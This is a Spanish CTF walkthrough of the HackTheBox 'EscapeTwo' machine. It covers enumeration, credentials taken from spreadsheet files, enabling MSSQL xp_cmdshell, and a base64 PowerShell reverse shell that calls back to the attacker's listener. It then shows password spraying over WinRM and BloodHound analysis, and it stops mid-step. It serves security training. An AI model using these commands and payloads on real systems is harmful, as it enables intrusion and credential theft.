Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #mssql #bloodhound #bloodyad #impacket #ad #esc4 #esc1 #certipy #password-spraying

![](assets/Pasted%20image%2020260121110733.png)

Credenciales iniciales rose / KxEPkKe6R8su
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ ping -c 1 10.129.69.138
PING 10.129.69.138 (10.129.69.138) 56(84) bytes of data.
64 bytes from 10.129.69.138: icmp_seq=1 ttl=127 time=112 ms

--- 10.129.69.138 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.659/111.659/111.659/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.69.138 -oG nmap/allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49728/tcp open  unknown          syn-ack ttl 127
49732/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr  un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49689,49690,49695,49706,49728,49732 -sV -sC -Pn -n -vvv 10.129.69.138 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-21 17:09:59Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| MDYwODE3MDA0MFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAN6t
| <MAS....>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-21T17:11:38+00:00; +4s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-21T17:11:38+00:00; +4s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| <MAS....>
|_-----END CERTIFICATE-----
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.69.138:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.69.138:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-01-21T17:11:38+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-21T17:06:24
| Not valid after:  2056-01-21T17:06:24
| MD5:   2688:0258:7699:a3e2:658f:d34b:4c6b:9abd
| SHA-1: e38c:756f:998b:6388:c03f:9bf7:e711:ff83:72c2:c574
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQHlmVZCG1C7JEvUCoegys4DANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwMTIxMTcwNjI0WhgPMjA1NjAxMjExNzA2MjRaMDsx
| <MAS...>
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| <MAS..>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-21T17:11:38+00:00; +4s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-21T17:11:38+00:00; +5s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-26T11:46:45
| Not valid after:  2124-06-08T17:00:40
| MD5:   b55a:a63f:50ba:ed44:f865:820a:5b8e:f493
| SHA-1: a87b:9555:5164:74d3:f73f:bded:72e7:baab:db76:c12a
| -----BEGIN CERTIFICATE-----
| MIIF6TCCBNGgAwIBAgITVAAAAAVjf8S2XKAtZAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAgFw0yNTA2MjYxMTQ2NDVaGA8yMTI0
| <MAS...>
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49728/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49732/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-01-21T17:11:03
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 46242/tcp): CLEAN (Timeout)
|   Check 2 (port 29795/tcp): CLEAN (Timeout)
|   Check 3 (port 65301/udp): CLEAN (Timeout)
|   Check 4 (port 51130/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
```

Por la informacion que tenemos puedo intuir que estamos contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RCP
- Puerto 139, 445 SMB
- Puerto 636 LDAP
- Puerto 1433 MSSQL.
- Puerto 5985 WinRm

## Enumeración

### Puerto 445.

Saque informacion general de la maquina.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb 10.129.69.138
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

- Tenemos el dominio **sequel.htb** y el nombre del maquina **DC01**.

Voy a colocarlo en el /etc/hosts.

```bash
10.129.69.138 sequel.htb DC01.sequel.htb DC01
```

Puedo enumera los shares a los que tengo acceso con mis credenciales iniciales:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --shares
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.69.138   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.129.69.138   445    DC01             [*] Enumerated shares
SMB         10.129.69.138   445    DC01             Share           Permissions     Remark
SMB         10.129.69.138   445    DC01             -----           -----------     ------
SMB         10.129.69.138   445    DC01             Accounting Department READ
SMB         10.129.69.138   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.69.138   445    DC01             C$                              Default share
SMB         10.129.69.138   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.69.138   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.69.138   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.69.138   445    DC01             Users           READ
```

- rose tiene permisos de lectura en los recursos no estándar **Accounting Department** y **User**.

Voy a enumerar los usuarios y guardármelos en una lista:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --users
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.69.138   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.129.69.138   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.69.138   445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain
SMB         10.129.69.138   445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain
SMB         10.129.69.138   445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account
SMB         10.129.69.138   445    DC01             michael                       2024-06-08 16:47:37 0
SMB         10.129.69.138   445    DC01             ryan                          2024-06-08 16:55:45 0
SMB         10.129.69.138   445    DC01             oscar                         2024-06-08 16:56:36 0
SMB         10.129.69.138   445    DC01             sql_svc                       2024-06-09 07:58:42 0
SMB         10.129.69.138   445    DC01             rose                          2024-12-25 14:44:54 0
SMB         10.129.69.138   445    DC01             ca_svc                        2026-01-21 17:12:30 0
```

Al momento de conectarme al recurso **Accounting Department** me doy cuenta de que solo existen 2 archivos `xlsx` los cuales me descargue:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ smbclient "//10.129.69.138/Accounting Department" -U 'rose'
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 10:52:21 2024
  ..                                  D        0  Sun Jun  9 10:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 10:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 10:52:07 2024

                6367231 blocks of size 4096. 790181 blocks available
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (13.4 KiloBytes/sec) (average 13.4 KiloBytes/sec)
smb: \> get accounts.xlsx
```

Al tratar de abrir los archivos con libreoffice solo me daba errores. Por lo cual decidí ver que tipo de archivo son con `file` y al parecer los archivos no son `xlsx` si no mas bien zips:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ file accounting_2024.xlsx
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate

┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ file accounts.xlsx
accounts.xlsx: Zip archive data, made by v2.0, extract using at least v2.0, last modified Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
```

Extraje `accounts.xls` y contenía estos archivos:

```bash
├── accounts.xlsx
├── docProps
│   ├── app.xml
│   ├── core.xml
│   └── custom.xml
├── _rels
└── xl
    ├── sharedStrings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── workbook.xml
    └── worksheets
        ├── _rels
        │   └── sheet1.xml.rels
        └── sheet1.xml
```

Revise uno por uno manualmente hasta que di con `xl/sharedStrings.xml`

```xml
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo/content]
└─$ \cat xl/sharedStrings.xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

- Parece un archivo de credenciales.

Lo formatee a JSON para verlo de mejor manera:

```json
{
  "users": [
    {
      "first_name": "Angela",
      "last_name": "Martin",
      "email": "angela@sequel.htb",
      "username": "angela",
      "password": "0fwz7Q4mSpurIt99"
    },
    {
      "first_name": "Oscar",
      "last_name": "Martinez",
      "email": "oscar@sequel.htb",
      "username": "oscar",
      "password": "86LxLBMgEWaKUnBG"
    },
    {
      "first_name": "Kevin",
      "last_name": "Malone",
      "email": "kevin@sequel.htb",
      "username": "kevin",
      "password": "Md9Wlq1E5bZnVDVo"
    },
    {
      "first_name": null,
      "last_name": null,
      "email": "sa@sequel.htb",
      "username": "sa",
      "password": "MSSQLP@ssw0rd!"
    }
  ]
}

```

Probé las credenciales manualmente y me sirvieron las cuentas de `oscar` y `sa`.

- `sa` suele ser el usuario administrador por defecto de `mssql`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb sequel.htb -u angela -p '0fwz7Q4mSpurIt99'
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.69.138   445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE

┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb sequel.htb -u oscar -p '86LxLBMgEWaKUnBG'
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.69.138   445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG

┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb sequel.htb -u kevin -p 'Md9Wlq1E5bZnVDVo'
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.69.138   445    DC01             [-] sequel.htb\kevin:Md9Wlq1E5bZnVDVo STATUS_LOGON_FAILURE


┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc mssql sequel.htb -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth
MSSQL       10.129.69.138   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.69.138   1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```


## Acceso Inicial.
### Puerto 1433.

Ahora que tengo credenciales de administrador para `mssql` me puedo conectar para ejecutar comandos: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ impacket-mssqlclient sa@10.129.69.138
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

Al probar la ejecución de comandos con `xp_cmdshell` se me indica que esta desactivado.

```bash
SQL (sa  dbo@master)> xp_cmdshell whoami
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

Lo puedo habilitar de la siguiente manera:

```bash
SQL (sa  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
```

Y ahora si puedo ejecutar comandos:

```bash
SQL (sa  dbo@master)> xp_cmdshell whoami
output
--------------
sequel\sql_svc
NULL
```

Ahora que tengo ejecución de comandos puedo entablarme una reverse shell, yo voy a utilizar la de PowerShell Base64 de [ReverseShellGenerator](https://www.revshells.com/)

- Primero me pongo en escucha.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nc -nlvp 9001
listening on [any] 9001 ..
```

- Ahora ejecuto la reverse shell:

```bash
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA0ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Y me llega la conexion.

```bash
connect to [10.10.16.34] from (UNKNOWN) [10.129.69.138] 54030
whoami
sequel\sql_svc
PS C:\Windows\system32> whoami
sequel\sql_svc
PS C:\Windows\system32>
```

## Escalada de Privilegios.

Dentro del sistema en el directorio ` C:\SQL2019\ExpressAdv_ENU` encontré un archivo de configuración:

```bash
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

- Se muestran las credenciales sql_svc / WqSZAF6CysDQbGb3

Al probar las credenciales veo que funcionan:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc smb sequel.htb -u sql_svc -p 'WqSZAF6CysDQbGb3'
SMB         10.129.69.138   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.69.138   445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
```

También sprayee la contraseña en distintos servicios, uno de ellos siendo WinRm:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ nxc winrm sequel.htb -u users.txt -p 'WqSZAF6CysDQbGb3'
WINRM       10.129.69.138   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
WINRM       10.129.69.138   5985   DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3
WINRM       10.129.69.138   5985   DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3
WINRM       10.129.69.138   5985   DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3
WINRM       10.129.69.138   5985   DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3
WINRM       10.129.69.138   5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
```

- La contraseña WqSZAF6CysDQbGb3 también sirve para el usuario ryan

Ahora me puedo conectar por WinRm y obtener la primera flag.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ evil-winrm -i sequel.htb -u ryan -p WqSZAF6CysDQbGb3

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
sequel\ryan
*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
d467bf772fd18f37bba2574b0cb71c88
```

Dentro del sistema no encontré nada interesante por lo cual opte por usar `bloodhound`

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Primero necesito usar un **ingestor** que se va a encargar de recopilar toda la informacion del dominio, en mi caso utilice [rusthound](https://github.com/g0h4n/RustHound-CE).

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escapetwo]
└─$ ./rusthound-ce -d sequel.htb -u ryan@sequel.htb -z
```

### Bloodhound, WriteOwner sobre ca_svc.

Al importar la data a bloodhound ve lo siguiente:

- ryan tiene el permiso **WriteOwner** sobre el usuario ca_svc.

![](assets/Pasted%20image%2020260121120848.png)

**WriteOwner** me permitirá convertirme en propietario del usuario **ca_svc** y, a su vez, otorgarme control total sobre dicha cuenta.

Con `bloodyad` puedo convertirme en dueño de la cuenta:

```bash
